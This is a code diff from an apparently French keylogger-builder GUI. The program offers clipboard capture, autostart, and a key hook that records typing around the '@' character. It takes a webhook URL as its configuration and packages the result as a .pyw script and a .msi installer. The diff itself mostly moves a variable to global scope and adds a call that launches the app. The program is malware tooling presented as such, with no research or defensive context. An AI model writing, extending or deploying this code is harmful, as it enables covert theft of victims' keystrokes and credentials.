@@ -124,6 +124,7 @@ def clipboard_option_func():
 def autostart_option_func():
     print("Option autostart activée")
 
+
 def capture_before_after_at_option_func():
     def touche(key):
         global historique, capture_apres_at, apres_at_buffer, compteur
@@ -193,6 +194,8 @@ def lancer_programme():
 
 
 
+temp_script = f"{nom_fichier}.pyw"
+
 
 def pyw():
     global nom_fichier
@@ -204,7 +207,6 @@ def pyw():
         messagebox.showerror("Erreur", "Nom du fichier vide")
         return
 
-    temp_script = f"{nom_fichier}.pyw"
 
     config = {
         "webhook": webhook_entry.get().strip(),
@@ -322,6 +324,9 @@ def pyw():
 
 
 def msi():
+
+    global temp_script
+
     messagebox.showwarning(message="Vous allez généré le .msi")
         
     messagebox.showinfo(title="Ne pas fermer", message="L'application risque de planter mais elle met en place le .msi, NE FERMEZ PAS ! ")
@@ -434,5 +439,19 @@ switch.pack()
 lancer_btn = ctk.CTkButton(app, text="Lancer le programme", font=ctk.CTkFont(size=16, weight="bold"), command=lancer_programme)
 lancer_btn.pack(pady=20)
 
+"""
+with open("logs.txt", "a") as fichier:
+        fichier.write(
+            f"------------------------------------\n"
+            f"\n"
+            f" [{time.strftime('%d-%m-%Y %H:%M:%S')}]     Ouverture du Keylog \n"
+            f"\n"
+            f"------------------------------------\n"
+            f"\n"
+        )
+        """
+
 def key():
     app.mainloop()
+
+key()
